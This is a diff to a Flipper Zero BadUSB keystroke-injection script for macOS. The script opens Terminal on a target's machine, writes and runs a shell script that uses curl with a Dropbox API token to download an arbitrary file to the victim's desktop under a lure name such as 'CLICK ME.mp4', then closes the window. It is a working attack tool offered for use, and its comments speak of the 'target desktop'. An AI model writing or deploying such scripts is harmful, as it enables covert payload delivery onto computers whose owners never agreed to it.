@@ -7,30 +7,12 @@ REM Version 1.0 MacOs
 REM Category: Execution 
 
 
-REM Copy and paste the osascript/code (lines 19-28) into the Script editor App on your MacOs
-REM Replace the "Your API Access token Here" (line 20) placeholder with your actual Dropbox API token. 
-REM Replace the "File Name" (line 22) placeholder with the name of the file you intend to download from dropbox
-REM Replace the "Dropbox File Path" (line 21) placeholder with the path of the file you want to download from Dropbox
-REM Save this script below as a Droptod.scpt file (Use Script Editor) to your/your targets desktop.
+REM Replace the "<API ACCESS TOKEN HERE>" Placeholder with your actual Dropbox API token 
+REM Replace "<DROPBOX URL HERE>" with the URL of the dropbox file
+REM Replace the "<CLICK ME.mp4>"  placeholder 
+REM with what you want the name of the file to be on the target desktop
+REM Must include file format (.jpeg .doc .txt .mp4) 
 
-
-
-
--- Dropbox API settings
-set ACCESS_TOKEN to "Your API Access token Here"
-set FILE_PATH to "Dropbox File Path"
-set SAVE_PATH to POSIX path of (path to desktop folder) & "File Name"
-
--- Download file from Dropbox
-do shell script "curl -X POST https://content.dropboxapi.com/2/files/download " & ¬
-	"--header \"Authorization: Bearer " & ACCESS_TOKEN & "\" " & ¬
-	"--header \"Dropbox-API-Arg: {\\\"path\\\": \\\"" & FILE_PATH & "\\\"}\" " & ¬
-	"--output \"" & SAVE_PATH & "\""
-
-
-
-REM Final step is to save the below Ducky Script as a .txt file lines 36-50 (main Read.me has step by step directions)
-REM and put the .txt file on your BADUSB flipper zero APP to execute the osascript through the terminal.
 
 
 ID 05ac:021e Apple:Keyboard
@@ -44,7 +26,12 @@ DELAY 1000
 STRING cd ~/Desktop
 ENTER
 DELAY 500
-STRING osascript Droptod.scpt
+STRING echo 'ACCESS_TOKEN="<API ACCESS TOKEN HERE>"; DOWNLOAD_URL="<DROPBOX URL HERE>"; SAVE_PATH="$HOME/Desktop/<CLICK ME.mp4>"; curl -L -o "$SAVE_PATH" --header "Authorization: Bearer $ACCESS_TOKEN" "$DOWNLOAD_URL"' > download.sh
+DELAY 500
+STRING chmod +x download.sh
+DELAY 500
+STRING ./download.sh
+DELAY 250
 ENTER
-DELAY 200
-GUI m
+DELAY 7000
+GUI w
